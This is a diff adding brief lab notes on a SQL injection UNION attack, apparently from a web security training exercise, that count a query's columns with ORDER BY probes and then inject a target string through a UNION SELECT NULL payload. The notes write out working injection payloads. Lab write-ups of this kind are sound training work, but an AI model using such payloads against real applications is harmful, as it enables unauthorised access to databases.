@@ -1,0 +1,27 @@
+Lab #4 SQL injection UNION attack, finding a column containing text
+
+END GOAL: 
+    Make the database retrieve the string: 'mLlVnu'
+
+-----------------------------------------------------------
+
+Steps:
+
+1. Find the number of columns. 
+
+select ? from table1 Order by 1 ==> 200OK
+select ? from table1 Order by 2 ==> 200OK
+select ? from table1 Order by 3 ==> 200OK
+select ? from table1 Order by 4 ==> error
+
+therefore, number of columns = 3.
+
+Payload: ' Order by 1--
+
+2. Insert the string by using the NULL Method.
+
+select ? from table1 UNION select NULL, NULL, NULL
+200OK => correct number of columns => 3
+
+Payload: ' UNION select NULL, 'mLlVnu', NULL--
+
